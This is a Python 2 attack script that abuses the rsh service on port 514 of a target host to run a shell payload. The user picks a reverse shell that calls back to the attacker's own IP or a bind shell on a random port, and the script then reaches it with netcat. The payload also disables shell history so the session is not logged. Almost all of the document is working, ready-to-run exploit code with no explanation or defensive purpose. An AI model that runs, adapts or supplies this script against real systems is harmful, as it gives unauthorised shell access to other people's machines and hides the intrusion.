#!/usr/bin/python2.7
#Rsh Shell
import sys
import socket
import random
import time
import subprocess
import signal
import threading

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def getNetworkIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('www.google.com', 0))
    return s.getsockname()[0]

def RunBindShell():
    BINDSHELL = 'python -c "import os,pty,socket;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.bind((\'0.0.0.0\', %s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');s.close()"'%(bindport)
    s.bind(('0.0.0.0', myport))
    s.connect((host,514))
    SEND="%s\0%s\0%s\0" % (fromuser, username, BINDSHELL)
    s.send("\0")
    s.send(SEND)
    time.sleep(0.5)
    test = s.recv(1024)
    s.close()
    print 'Using Netcat To Connect To %s On Port %s\nType Exit Into The Shell Properly Kill The Open Port\n----------------------------------------------------'% (host, str(bindport))
    subprocess.call(['nc' , str(host), str(bindport)])
    
def RunReverseShell():
    uselocalip = raw_input('Get Ip Automatically? y/n:')
    if uselocalip.lower() =="y":
        localip = getNetworkIp()
    else: 
        localip = raw_input('Type Your Ip For Reverse Connection:')
    print "Ip Changed To %s"%(localip)
    REVERSESHELL = 'python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'%s\',%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');s.close()"'%(localip, bindport)
    s.bind(('0.0.0.0', myport))
    s.connect((host,514))
    SEND="%s\0%s\0%s\0" % (fromuser, username, REVERSESHELL)
    s.send("\0")
    s.send(SEND)
    print 'Using Netcat To Listen To On Port %s\nType Exit Into The Shell Properly Kill The Open Port\n----------------------------------------------------'% (str(bindport))
    subprocess.call(['nc' ,'-lp', str(bindport)])
    time.sleep(0.5)
    test = s.recv(1024)
    s.close()


if len(sys.argv) < 4:
    print "Example ./rsh.py 10.10.10.10(ip) foobar(fromuser) foobar(username)"
    sys.exit()
else:
    host = sys.argv[1]
    fromuser = sys.argv[2]
    username = sys.argv[3]

startport,endport = 600,900
myport =  random.randrange(startport, endport)
startbindport,endbindport = 5000,6000
bindport =  random.randrange(startbindport, endbindport)

payloadtype = raw_input('------------------------\n1.)Reverse Shell \n2.)Bind Shell\n------------------------\nChoose Your Option:')
if payloadtype ==str("2"):
    RunBindShell()
elif payloadtype ==str("1"):
    RunReverseShell()
else:
    print "Invalid Option"
    sys.exit()
